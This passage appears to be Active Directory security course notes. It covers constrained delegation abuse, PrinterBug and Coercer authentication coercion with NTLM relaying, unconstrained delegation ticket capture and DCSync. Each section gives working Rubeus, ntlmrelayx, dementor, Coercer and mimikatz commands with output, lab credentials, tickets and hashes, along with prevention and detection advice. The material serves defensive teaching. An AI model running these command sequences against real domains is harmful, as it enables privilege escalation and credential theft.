- Enforce `SIDHistory` filtering between the domains in forests to prevent the escalation from a child domain to a parent domain (because the escalation path involves abusing the `SIDHistory` property by setting it to that of a privileged group, for example, `Enterprise Admins`). However, doing this may result in potential issues in migrating domains.

## Detection

Correlating users' behavior is the best technique to detect abuse of forged tickets. Suppose we know the location and time a user regularly uses to log in. In that case, it will be easy to alert on other (suspicious) behaviors—for example, consider the account 'Administrator' in the attack described above. If a mature organization uses `Privileged Access Workstations` (`PAWs`), they should be alert to any privileged users not authenticating from those machines, proactively monitoring events with the ID `4624` and `4625` (successful and failed logon).

Domain Controllers will not log events when a threat agent forges a Golden Ticket from a compromised machine. However, when attempting to access another system(s), we will see events for successful logon originating from the compromised machine with Event ID `4624`.

Another detection point could be a TGS service requested for a user without a previous TGT. However, this can be a tedious task due to the sheer volume of tickets (and many other factors). If we go back to the attack scenario, by running `dir \\dc1\c$` at the end, we generated two TGS tickets on the Domain Controller: Event ID `4769`, and Event ID `4769` both showing admin logs from the same IP.

The only difference between the tickets is the service. However, they are ordinary compared to the same events not associated with the `Golden Ticket`.

If `SID filtering` is enabled, we will get alerts with the event ID `4675` during cross-domain escalation.

## Note

If an Active Directory forest has been compromised, we need to reset all users' passwords and revoke all certificates, and for `krbtgt`, we must reset its password twice (in `every domain`). The password history value for the `krbtgt` account is 2. Therefore it stores the two most recent passwords. By resetting the password twice, we effectively clear any old passwords from the history, so there is no way another DC will replicate this DC by using an old password. However, it is recommended that this password reset occur at least 10 hours apart from each other (maximum user ticket lifetime); otherwise, expect some services to break if done in a shorter period.

# Kerberos Constrained Delegation

`Kerberos Delegation` enables an application to access resources hosted on a different server; for example, instead of giving the service account running the web server access to the database directly, we can allow the account to be delegated to the SQL server service. Once a user logs into the website, the web server service account will request access to the SQL server service on behalf of that user, allowing the user to get access to the content in the database that they’ve been provisioned to without having to assign any access to the web server service account itself.

We can configure three types of delegations in Active Directory:

- `Unconstrained Delegation` (most permissive/broad)
- `Constrained Delegation`
- `Resource-based Delegation`

Knowing and understanding that `any` type of delegation is a possible security risk is paramount, and we should avoid it unless necessary.

As the name suggests, `unconstrained delegation` is the most permissive, allowing an account to delegate to any service. In `constrained delegation`, a user account will have its properties configured to specify which service(s) they can delegate. For r`esource-based delegation`, the configuration is within the computer object to whom delegation occurs. In that case, the computer is configured as `I trust only this/these accounts`. It is rare to see `Resource-based delegation` configured by an Administrator in production environments ( threat agents often abuse it to compromise devices). However, `Unconstrained` and `Constrained` delegations are commonly encountered in production environments.

## The Attack

We will only showcase the abuse of `constrained delegation`; when an account is trusted for delegation, the account sends a request to the `KDC` stating, "Give me a Kerberos ticket for user YYYY because I am trusted to delegate this user to service ZZZZ", and a Kerberos ticket is generated for user YYYY (without supplying the password of user YYYY). It is also possible to delegate to another service, even if not configured in the user properties. For example, if we are trusted to delegate for `LDAP`, we can perform protocol transition and be entrusted to any other service such as `CIFS` or `HTTP`.

To demonstrate the attack, we assume that the user `web_service` is trusted for delegation and has been compromised. To begin, we will use the `Get-NetUser` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) (`PowerCiew-main.ps1`) to enumerate user accounts that are trusted for constrained delegation in the domain:

```PowerShell
PS C:\Users\bob\Downloads> Get-NetUser -TrustedToAuth

logoncount                    : 23
badpasswordtime               : 12/31/1601 4:00:00 PM
distinguishedname             : CN=web service,CN=Users,DC=eagle,DC=local
objectclass                   : {top, person, organizationalPerson, user}
displayname                   : web service
lastlogontimestamp            : 10/13/2022 2:12:22 PM
userprincipalname             : webservice@eagle.local
name                          : web service
objectsid                     : S-1-5-21-1518138621-4282902758-752445584-2110
samaccountname                : webservice # will use this fro Robeus
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 10/13/2022 9:53:09 PM
instancetype                  : 4
usncreated                    : 135866
objectguid                    : b89f0cea-4c1a-4e92-ac42-f70b5ec432ff
lastlogoff                    : 1/1/1600 12:00:00 AM
msds-allowedtodelegateto      : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local, http/DC1, http/DC1.eagle.local/EAGLE...} #and this tells us what `service/where` it has delegation power to
objectcategory                : CN=Person,CN=Schema, CN=Configuration,DC=eagle,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {cvs/dc1.eagle.local, cvs/dc1}
givenname                     : web service
lastlogon                     : 10/14/2022 2:31:39 PM
badpwdcount                   : 0
cn                            : web service
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated                   : 10/13/2022 8:32:35 PM
primarygroupid                : 513
pwdlastset                    : 10/13/2022 10:36:04 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 143463
```

We can see that the user `web_service` is configured for delegating the HTTP service to the Domain Controller `DC1`. The HTTP service provides the ability to execute `PowerShell Remoting`. Therefore, any threat actor gaining control over `web_service` can request a Kerberos ticket for any user in Active Directory and use it to connect to `DC1` over `PowerShell Remoting`.

Before we request a ticket with `Rubeus` (which expects a password hash instead of cleartext for the `/rc4` argument used subsequently), we need to use it to convert the plaintext password we compromised before this attack into its `NTLM` hash equivalent:
```PowerShell
PS C:\Users\bob\Downloads> .\Rubeus.exe hash /password:compromised_password
```

Then, we will use `Rubeus` to get a ticket for the `Administrator` account (arbitrary?):

```PowerShell
PS C:\Users\bob\Downloads> .\Rubeus.exe s4u /user:webservice /rc4:password_NTLM_hash /domain:ADdomain.fqdn /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:path.we.got.from.allowedtodelegateto /ptt

...
[+] TGT request successful!
...
[+] Ticket successfully imported!
...
```

We're using `/ptt` to impersonate `Administrator` in our session.

we can again verify our identity with `klist`.

With the ticket being available, we can connect to the Domain Controller impersonating the account `Administrator`:
```PowerShell
PS C:\Users\bob\Downloads> Enter-PSSession dc1
[dc1]: PS C:\Users\Administrator\Documents> hostname
DC1
[dc1]: PS C:\Users\Administrator\Documents> whoami
eagle\administrator
[dc1]: PS C:\Users\Administrator\Documents>
```

If the last step fails (we may need to do `klist purge`, obtain new tickets, and try again by rebooting the machine). We can also request tickets for multiple services with the `/altservice` argument, such as `LDAP`, `CFIS`, `time`, and `host`.

## Prevention

Fortunately, when designing Kerberos Delegation, Microsoft implemented several protection mechanisms; however, it did not enable them by default to any user account. There are two direct ways to prevent a ticket from being issued for a user via delegation:

- Configure the property `Account is sensitive and cannot be delegated` for all privileged users.
- Add privileged users to the `Protected Users` group: this membership automatically applies the protection mentioned above (however, it is not recommended to use `Protected Users` without first understanding its potential implications).

We should treat any account configured for delegation as extremely privileged, regardless of its actual privileges (such as being only a Domain user). Cryptographically secure passwords are a must, as we don't want `Kerberoasting` giving threat agents an account with delegation privileges.

## Detection

Correlating users' behavior is the best technique to detect `constrained delegation` abuse. Suppose we know the location and time a user regularly uses to log in. In that case, it will be easy to alert on other (suspicious) behaviors—for example, consider the account 'Administrator' in the attack described above. If a mature organization uses `Privileged Access Workstations` (`PAWs`), they should be alert to any privileged users not authenticating from those machines, proactively monitoring events with the ID `4624` (successful logon).

In some occasions, a successful logon attempt with a delegated ticket will contain information about the ticket's issuer under the `Transited Services` attribute in the events log. This attribute is normally populated if the logon resulted from an `S4U` (`Service For User`) logon process.

`S4U` is a Microsoft extension to the Kerberos protocol that allows an application service to obtain a Kerberos service ticket on behalf of a user; if we recall from the attack flow when utilizing `Rubeus`, we specified this `S4U` extension.

# Printer Spooler & NTLM Relaying

The [Print Spooler](https://learn.microsoft.com/en-us/windows/win32/printdocs/print-spooler) is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, `Lee Christensen` found the `PrinterBug`. The functions `RpcRemoteFindFirstPrinterChangeNotification` and `RpcRemoteFindFirstPrinterChangeNotificationEx` can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the reverse connection will carry authentication information as a `TGT`. Therefore, any domain user can coerce `RemoteServer$` to authenticate to any machine. Microsoft's stance on the `PrinterBug` was that it will not be fixed, as the issue is "by-design".

The impact of `PrinterBug` is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:

1. Relay the connection to another DC and perform DCSync (if `SMB Signing` is disabled).
2. Force `Domain Controller` to connect to a machine configured for `Unconstrained Delegation` (`UD`) - this will cache the `TGT` in the memory of the `UD server`, which can be captured/exported with tools like Rubeus and Mimikatz.
3. Relay the connection to `Active Directory Certificate Services` to obtain a certificate for the `Domain Controller`. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
4. Relay the connection to configure `Resource-Based Kerberos Delegation` for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.

## The Attack

In this attack path, we will relay the connection to another DC and perform `DCSync` (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.

To begin, we will configure `NTLMRelayx` to forward any connections to DC2 and attempt to perform the DCSync attack:
```bash
$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections # <--
```

Next, we need to trigger the `PrinterBug` using the Kali box with `NTLMRelayx` listening. To trigger the connection back, we'll use [Dementor](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py) (when running from a non-domain joined machine, any authenticated user credentials are required, and in this case, we assumed that we had previously compromised Bob):
```bash
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

[*] connecting to 172.16.18.3
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
[*] done!
```

Now, switching back to the terminal session with `NTLMRelayx`, we will see that `DCSync` was successful the password hashes successfully extracted (eg, krbtgt, Administrator..).

## Prevention

Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.

Additionally, there is an option to prevent the abuse of the `PrinterBug` while keeping the service running: when disabling the registry key `RegisterSpoolerRemoteRpcEndPoint`, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it.

## Detection

Exploiting the `PrinterBug` will leave traces of network connections toward the Domain Controller; however, they are too generic to be used as a detection mechanism.

In the case of using `NTLMRelayx` to perform DCSync, no event ID `4662` is generated (as mentioned in the DCSync section); however, to obtain the hashes as DC1 from DC2, there will be a successful logon event for DC1. This event originates from the IP address of the Kali machine, not the Domain Controller.

A suitable detection mechanism always correlates all logon attempts from core infrastructure servers to their respective IP addresses (which should be static and known).

## Honeypot

It is possible to use the `PrinterBug` as means of alerting on suspicious behavior in the environment. In this scenario, we would block outbound connections from our servers to ports `139` and `445`; software or physical firewalls can achieve this. Even though abuse can trigger the bug, the firewall rules will disallow the reverse connection to reach the threat agent. However, those blocked connections will act as signs of compromise for the blue team. Before enforcing anything related to this exploit, we should ensure that we have sufficient logs and knowledge of our environment to ensure that legitimate connections are allowed (for example, we must keep the mentioned ports open between DCs, so that they can replicate data).

While this may seem suitable for a honeypot to trick adversaries, we should be careful before implementing it, as currently, the bug requires the machine to connect back to us, but if a new unknown bug is discovered, which allows for some type of Remote Code Execution without the reverse connection, then this will backfire on us. Therefore, we should only consider this option if we are an extremely mature organization and can promptly act on alerts and disable the service on all devices should a new bug be discovered.

# Coercing Attacks & Unconstrained Delegation

Incredibly similar to `Print Spooler & STLM Relaying` section right before.

Coercing attacks have become a `one-stop shop` for escalating privileges from any user to Domain Administrator. Nearly every organization with a default AD infrastructure is vulnerable. We've just tasted coercing attacks when we discussed the `PrinterBug`. However, several other RPC functions can perform the same functionality. Therefore, any domain user can coerce `RemoteServer$` to authenticate to any machine in the domain. Eventually, the [Coercer](https://github.com/p0dalirius/Coercer) tool was developed to exploit all known vulnerable RPC functions simultaneously.

Similar to the `PrinterBug`, an attacker can choose from several "follow up" options with the reverse connection, which, as mentioned before, are:

- Relay the connection to another DC and perform DCSync (if `SMB Signing` is disabled).
- Force the Domain Controller to connect to a machine configured for `Unconstrained Delegation` (`UD`) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like `Rubeus` and `Mimikatz`.
- Relay the connection to `Active Directory Certificate Services` to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
- Relay the connection to configure `Resource-Based Kerberos Delegation` for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.


## The Attack

We will abuse the second "follow-up", assuming that an attacker has gained administrative rights on a server configured for `Unconstrained Delegation`. We will use this server to capture the TGT, while `Coercer` will be executed from the Kali machine.

To identify systems configured for `Unconstrained Delegation`, we can use the `Get-NetComputer` function from [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) along with the `-Unconstrained` switch:
```PowerShell
PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname

samaccountname
--------------
DC1$
SERVER01$ # <---
WS001$ # <---
DC2$
```

`WS001` and `SERVER01` are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host. We will start `Rubeus` in an administrative prompt to monitor for new logons and extract TGTs:
```PowerShell
PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs


[*] 18/12/2022 22.37.09 UTC - Found new TGT:

  User                  :  bob@EAGLE.LOCAL
  StartTime             :  18/12/2022 23.30.09
  EndTime               :  19/12/2022 09.30.09
  RenewTill             :  25/12/2022 23.30.09
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

doIE2jCCBNagAwIBBaEDAgEWooID5zCCA+NhggPfMIID26ADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0
GwtFQUdMRS5MT0NBTKOCA6EwggOdoAMCARKhAwIBAqKCA48EggOLxoWz+JE4JEP9VvNlDvGKzqQ1BjjpjjO03haKFPPeszM4Phkb    QQBPfixBqQ3bthdsizmx3hdjNzFVKnUOK2h2CDFPeUia+0rCn1FllimXQwdEFMri7whC2qA4/vy52Y2jJdmkR7ZIRAeU5Yfm373L
iEHgnX4PCA94Ck/BEwUY0bk6VAWkM2FSPgnuiCeQQ4yJMPa3DK6MHYJ/1kZy+VqxwSqov/tVhATshel1vXpr4rz03ofgNtwLDYb+    K5AGYSbSct5w1jTWtGAicCCr1vpcUguIWH0Nh1lQ+tZccVtEtsrjZ/jwCKsadQWIFwhPOnVpf5drUlav1iCXmxWqQr5glW/IOOE1
lHsBolieGSyY20ZHBYjXflCGkO13mRwqO3rQ5KMs8HrC3Aqu7Popaw29at0vzZLinYnWnHUn01hh5e3QyIkqIH3CBvaPbl3RukZ7    jZRBm6BVF7R5KEWp+6Gg2joP6WvXDBCIzqL3jmxQ8NVoeeidgnBuZKpYL45E8jJjxbW4t9D8EdlX9Xu+fj/Fazw08HtRkzwG30vE
	<SNIP>
	<SNIP>
	<SNIP>
	
[*] Ticket cache size: 4
```

Next, we need to know the IP address of WS001, which we can be obtain by running `ipconfig`. Once known, we will switch to the Kali machine to execute `Coercer` towards DC1, while we force it to connect to WS001 if coercing is successful:

```bash
jucapik42@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v1.6
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[dc1.eagle.local] Analyzing available protocols on the remote machine and perform RPC calls to coerce authentication to ws001.eagle.local ...
   [>] Pipe '\PIPE\lsarpc' is accessible!
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcOpenFileRaw' (opnum 0) ... rpc_s_access_denied
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 4) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcDecryptFileSrv' (opnum 5) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryUsersOnFile' (opnum 6) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcQueryRecoveryAgents' (opnum 7) ... ERROR_BAD_NETPATH (Attack has worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\lsarpc' targeting 'MS-EFSR::EfsRpcEncryptFileSrv' (opnum 12) ... ERROR_BAD_NETPATH (Attack has worked!)
   [>] Pipe '\PIPE\netdfs' is accessible!
      [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsAddStdRoot' (opnum 12) ... rpc_s_access_denied (Attack should have worked!)
      [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...       [>] On 'dc1.eagle.local' through '\PIPE\netdfs' targeting 'MS-DFSNM::NetrDfsRemoveStdRoot' (opnum 13) ...    [>] Pipe '\PIPE\spoolss' is accessible!
      [>] On 'dc1.eagle.local' through '\PIPE\spoolss' targeting 'MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx' (opnum 65) ... rpc_s_access_denied (Attack should have worked!)

[+] All done!
```

Now, if we switch to WS001 and look at the continuous output that `Rubeus` provide, there should be a TGT for DC1 available:
```PowerShell
[*] 18/12/2022 22.55.52 UTC - Found new TGT:

  User                  :  DC1$@EAGLE.LOCAL # <-------
  StartTime             :  18/12/2022 23.30.21
  EndTime               :  19/12/2022 09.30.21
  RenewTill             :  24/12/2022 09.28.39
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFdDCCBXCgAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0    GwtFQUdMRS5MT0NBTKOCBDowggQ2oAMCARKhAwIBAqKCBCgEggQkv8ILT9IdJgNgjxbddnICsd5quqFnXS7m7YwJIM/lcwLy4SHI
i1iWbvsTiu078mz28R0sn7Mxvg2oVC7NTw+b2unvmQ3utRLTgaz02WYnGWSBu7gxs+Il/0ekW5ZSX3ESq0AGwPaqUcuWSFDNNfOM
ws/8MlkJeFSFWeHwJL7FbzuCjZ2x/6UUl2IOYq0Ozaf3R+rDJQ6LqpDVAet53IoHDugduBfZoDHTZFntRAoYrmAWdcnFdUEpyZGH    Kj6i2M0TyrxUp3nq022BNB6v+sHgH3SWsMNiba+TYaeRdjiM2nVjhGZTXDuro9rLkYFk1HPXuI/d0RfzVuq9Hh5hVCZRwcM3V2BN
eYRTMeW+lvz1bBgdgK/wlYMS7J99F1V/r6K8zdO7pQ0Zj216DfA42QINPswVL+89gy7PLLm5aYlw8nlbBdvTZrPbeOhtvdBy/pFB    fxrjHA+fW34/Yk+9k6oSPXCaCQ/Rd1qZ/P57/0MDUYRlDs5EYOOxxGQPVFbOqhbG414vGRbi39ALj/MkYG629kCEb9K89p5teo6f
7w/4M6Ytun16sG3GxsWDG6dlZP+fmmOr0nwdXgvT28NQxQ3EEMErX+BojUY6DdRBH2u3fcv1KOA5K7MDma+cVLaa0YjSYZ2IDRaC    0JcgcUexd6EfQPtSnikaA/zzYmu/PSYVXlcg7cFULJIiPuN4f9VlDlVOqj8C3xCwtYo4zRklLESUES9tGK/VfsmN0Q/Fx5ULIa7y
UND/d1HlQ+R6Fnh2GGUPk+LlVw+ScD0kf2nmmlsIwhnGmscpiFs1lprX35Khlx/y5+v9S7bdokZujPpyZactQ4wdfRK++bOWo2ao    Ewrzjuq199JnTQHbxkqGgeKQedOPxOhDccQLYTm44wH73JuE+XoGKmdGbgXfjSBFlTinP9mvZA12NkQupnGYVzJ2rS1T0nf2VVUW
MfIgh8Nz4xYvDHV1iIV4ZrLI7u7ZwJtrlESgO0H0d/k6CpLxo5L7kzhkU+MJggdUFJvS3HskTxZmewEwSdKJn21YfAG1Q6X0nFqk
HdK3RUvxXcycwMvWdfYH2AW06+98q5h+TSJQrMcrp9gT+khLPD4KL2n6+cvC3BVHqge5Nc16LhW7kcNp+JcIzknwAsCZlaXzhz3X
K78ooLfZGaKGoNnDWLUQpYToVgXXSO53HJ3Vgl0MwctV7l+gJdwMtac0VVhH8EAndeSPnEcNOX8mr/30k+9GwM1wtFQNFB03CdoA    qRJBjyFw1h1KKuc61PTWuxVLwGmezshekwoSLOJ7V9G9qNpVQl0AgtTK2SHeobItuD4rhDc3/0jJ4LzsXJieYbLK7dtVfxYtSbeu
ZqXhd7HcSq5SN4LOmEP1tScir+shxQC+hbs3oYx/rHfj8GDDEZ8UwY6I4JF4pQsApKOB3zCB3KADAgEAooHUBIHRfYHOMIHLoIHI    MIHFMIHCoCswKaADAgESoSIEIDs9gBc+2myj4I7mPmXH542vha3A2zfkHbm/RxnK4oMSoQ0bC0VBR0xFLkxPQ0FMohEwD6ADAgEB
oQgwBhsEREMxJKMHAwUAYKEAAKURGA8yMDIyMTIxODIyMzAyMVqmERgPMjAyMjEyMTkwODMwMjFapxEYDzIwMjIxMjI0MDgyODM5
WqgNGwtFQUdMRS5MT0NBTKkgMB6gAwIBAqEXMBUbBmtyYnRndBsLRUFHTEUuTE9DQUw=

[*] Ticket cache size: 5
```

We can use this TGT for authentication within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack (among others).

One way of using the abovementioned TGT is through Rubeus, as follows.
```PowerShell
PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
PS C:\Users\bob\Downloads> klist

Current LogonId is 0:0x101394

Cached Tickets: (1)

#0>     Client: DC1$ @ EAGLE.LOCAL
        Server: krbtgt/EAGLE.LOCAL @ EAGLE.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 4/21/2023 8:54:04 (local)
        End Time:   4/21/2023 18:54:04 (local)
        Renew Time: 4/28/2023 8:54:04 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.
```PowerShell
PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:eagle.local /user:Administrator
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 02.00.00
Password last change : 07/08/2022 21.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6fd69313922373216cdbbfa823bd268d

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
      aes128_hmac       (4096) : 4667ae9266d48c01956ab9c869e4370f
      des_cbc_md5       (4096) : d9b53b1f6d7c45a8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Credentials
      des_cbc_md5       : d9b53b1f6d7c45a8


mimikatz # exit
Bye!
```

## Prevention

Windows does not offer granular visibility and control over RPC calls to allow discovering what is being used and block certain functions. Therefore, an out-of-the-box solution for preventing this attack does not exist currently. However, there are two different general approaches to preventing coercing attacks:

1. Implementing a third-party RPC firewall, such as the one from [zero networks](https://github.com/zeronetworks/rpcfirewall), and using it to block dangerous RPC functions. This tool also comes up with an audit mode, allowing monitoring and gaining visibility on whether business disruptions may occur by using it or not. Moreover, it goes a step further by providing the functionality of blocking RPC functions if the dangerous `OPNUM` associated with coercing is present in the request. (Note that in this option, for every newly discovered RPC function in the future, we will have to modify the firewall's configuration file to include it.)
2. Block Domain Controllers and other core infrastructure servers from connecting to outbound ports `139` and `445`, `except` to machines that are required for AD (as well for business operations). One example is that while we `block general outbound traffic` to ports `139` and `445`, we still should allow it for cross Domain Controllers; otherwise, domain replication will fail. (The benefit of this solution is that it will also work against newly discovered vulnerable RPC functions or other coercing methods.)

## Detection

As mentioned, Windows does not provide an out-of-the-box solution for monitoring RPC activity. The RPC Firewall from [zero networks](https://github.com/zeronetworks/rpcfirewall) is an excellent method of detecting the abuse of these functions and can indicate immediate signs of compromise; however, if we follow the general recommendations to not install third-party software on Domain Controllers then firewall logs are our best chance.

A successful coercing attack with Coercer will result in the following host firewall log, where the machine at .128 is the attacker machine and the .200 is the Domain Controller.

[pfirewall network log](./Coercer-FirewallLogs.webp)

We can see plenty of incoming connections to the DC, followed up by outbound connections from the DC to the attacker machine; this process repeats a few times as Coercer goes through several different functions. All of the outbound traffic is destined for port 445.

If we go forward and block outbound traffic to port 445, then we will observe the following behavior:

[139 and 445 protection](./Coercer-FirewallLogsBlockOutbound139n445.webp)

Now we can see that even though the inbound connection is successful, the firewall drops the outbound one, and consequently, the attacker does not receive any coerced TGTs. Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports `139` and `445` is recommended.

The above can also be used for detection, as any unexpected dropped traffic to ports `139` or `445` is suspicious.

# Object ACLs

TLDR: Bloodhound and Sharphound

In Active Directory, [Access Control Lists (ACLs)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists) are tables, or simple lists, that define the trustees who have access to a specific object and their access type. A trustee may be any security principal, such as a user account, group, or login session. Each `access control list` has a set of `access control entries` (`ACE`), and each ACE defines the trustee and the type of access the trustee has. Therefore, an object can be accessed by multiple trustees since there can be various ACEs. Access control lists are also used for auditing purposes, such as recording the number of access attempts to a securable object and the type of access. A securable object is any named object in Active Directory that contains a security descriptor, which has the security information about the object, which includes ACLs.

An example of an `Access Control Entry` is that, by default, AD gives Domain Admins the right to modify the password of every object. However, rights can also be delegated to certain users or groups that can perform a specific action on other objects; this can be password resets, modification of group membership, or deletion of objects. In large organizations, if it is virtually impossible to avoid non-privileged users ending up with delegated rights, they should eliminate human error and have well-defined process documentation. For example, suppose an employee was to (accidentally/intentionally) change their department from IT to Security Operations. In that case, the organization must have a process to revoke all rights and access to systems and applications. In real-life AD environments, we will often encounter cases such as:

- All Domain users added as Administrators to all Servers
- Everyone can modify all objects (having full rights to them).
- All Domain users have access to the computer's extended properties containing the LAPS passwords.

## The Attack

To identify potential abusable ACLs, we will use [BloodHound](https://github.com/BloodHoundAD/BloodHound) to graph the relationships between the objects and [SharpHound](https://github.com/BloodHoundAD/SharpHound) to scan the environment and pass All to the -c parameter (short version of CollectionMethod):
```PowerShell
PS C:\Users\bob\Downloads> .\SharpHound.exe -c All

2022-12-19T14:16:39.1749601+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
